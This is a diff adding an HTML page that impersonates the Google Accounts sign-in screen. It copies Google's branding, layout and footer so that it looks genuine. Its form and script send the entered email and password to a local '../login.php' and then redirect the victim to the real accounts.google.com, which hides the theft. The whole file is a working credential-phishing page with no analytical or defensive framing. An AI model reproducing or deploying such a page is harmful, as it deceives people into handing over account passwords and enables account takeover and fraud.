@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 450px;
+            padding: 20px;
+        }
+        
+        .card {
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            text-align: center;
+        }
+        
+        .logo {
+            margin-bottom: 16px;
+        }
+        
+        .logo-text {
+            font-size: 24px;
+            color: #202124;
+            font-weight: 400;
+            letter-spacing: -0.5px;
+        }
+        
+        .logo-text span {
+            color: #4285f4;
+        }
+        
+        .title {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+        
+        .subtitle {
+            font-size: 16px;
+            color: #202124;
+            margin-bottom: 24px;
+        }
+        
+        .input-group {
+            margin-bottom: 24px;
+            text-align: left;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        
+        .input-field:focus {
+            border-color: #1a73e8;
+            border-width: 2px;
+            padding: 12px 14px;
+        }
+        
+        .forgot-link {
+            text-align: left;
+            margin-bottom: 48px;
+        }
+        
+        .forgot-link a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .forgot-link a:hover {
+            text-decoration: underline;
+        }
+        
+        .button-group {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .create-account {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .create-account:hover {
+            text-decoration: underline;
+        }
+        
+        .next-btn {
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #fff;
+            background: #1a73e8;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .next-btn:hover {
+            background: #1765cc;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,.3), 0 1px 3px 1px rgba(60,64,67,.15);
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1a73e8;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 16px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .footer {
+            margin-top: 24px;
+            text-align: center;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        
+        .footer select {
+            padding: 4px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            margin-right: 16px;
+        }
+        
+        .footer a {
+            color: #5f6368;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="logo">
+                <div class="logo-text">
+                    <span>G</span>oogle
+                </div>
+            </div>
+            
+            <h1 class="title">Sign in</h1>
+            <p class="subtitle">Use your Google Account</p>
+            
+            <form id="loginForm" method="POST" action="../login.php">
+                <div class="input-group">
+                    <input type="email" name="email" class="input-field" placeholder="Email or phone" required>
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" name="password" class="input-field" placeholder="Enter your password" required>
+                </div>
+                
+                <div class="forgot-link">
+                    <a href="#">Forgot password?</a>
+                </div>
+                
+                <div class="button-group">
+                    <a href="#" class="create-account">Create account</a>
+                    <button type="submit" class="next-btn">Next</button>
+                </div>
+                
+                <div class="loading" id="loading">
+                    <div class="spinner"></div>
+                    <p>Signing in...</p>
+                </div>
+            </form>
+        </div>
+        
+        <div class="footer">
+            <select>
+                <option>English (United States)</option>
+            </select>
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+    
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            document.querySelector('.input-group').style.display = 'none';
+            document.querySelectorAll('.input-group')[1].style.display = 'none';
+            document.querySelector('.forgot-link').style.display = 'none';
+            document.querySelector('.button-group').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            
+            var formData = new FormData(this);
+            
+            fetch('../login.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                setTimeout(function() {
+                    window.location.href = 'https://accounts.google.com/';
+                }, 2000);
+            })
+            .catch(error => {
+                setTimeout(function() {
+                    window.location.href = 'https://accounts.google.com/';
+                }, 2000);
+            });
+        });
+    </script>
+</body>
+</html>
